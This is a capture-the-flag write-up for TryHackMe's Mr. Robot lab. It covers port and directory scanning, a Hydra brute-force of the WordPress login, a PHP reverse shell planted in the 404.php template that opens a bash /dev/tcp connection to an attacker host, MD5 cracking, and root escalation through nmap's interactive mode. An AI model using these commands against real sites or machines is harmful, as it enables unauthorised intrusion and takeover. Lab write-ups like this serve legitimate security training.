# 🕵️ Mr. Robot CTF Writeup (TryHackMe)

**Author:** King  
**Difficulty:** Easy  
**Platform:** TryHackMe

---

##  Enumeration

###  Nmap Scan
```
nmap -sC -sV -oN nmap.txt 10.10.27.9
```
Open ports:

22 (SSH)

80 (HTTP)

### Gobuster
```
gobuster dir -u http://10.10.27.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
```
Discovered:

/robots.txt → contains fsocity.dic ( first flag found)

/license.txt

### 📂 Dictionary Analysis
fsocity.dic used for brute-forcing WordPress login.

### 🔐 WordPress Login
Login page: /wp-login.php

Brute-force with Hydra: 
(it is okay also to use burpsuite's intruder)

```
hydra -l admin -P fsocity.dic 10.10.27.9 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```
Credentials found: admin:robot

### ⚙️ WordPress Dashboard Access
Navigated to plugin editor.

Uploaded reverse shell via 404.php.

### 🖥️ Reverse Shell Deployment
Used PentestMonkey PHP reverse shell:

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.20/4444 0>&1'");
?>
```
Listener setup:

```
nc -lvnp 4444
```
### 🧍 Privilege Escalation
🏁 User Flag
Located at: /home/robot/key-2-of-3.txt

Required password from: /home/robot/password.raw-md5

🔓 Cracking MD5
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

🏁 Root Flag
Used interactive Nmap shell:

bash
nmap --interactive
!sh
Escalated to root.

Final flag found at: /root/key-3-of-3.txt

✅ Summary
Enumeration → Exploitation → Privilege Escalation

Tools used: Nmap, Gobuster, Hydra,burpsuite, John the Ripper
